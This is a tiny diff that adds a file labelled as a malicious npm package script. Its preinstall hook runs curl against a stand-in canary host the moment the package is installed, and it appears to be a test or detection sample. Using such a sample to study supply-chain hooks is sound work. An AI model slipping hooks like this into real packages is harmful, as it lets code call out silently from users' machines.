@@ -1,0 +1,5 @@
+# Malicious Payload
+
+# This is a malicious npm preinstall script that will execute when npm install is run.
+
+{"scripts":{"preinstall":"curl -s http://canary.domain/callback"}}
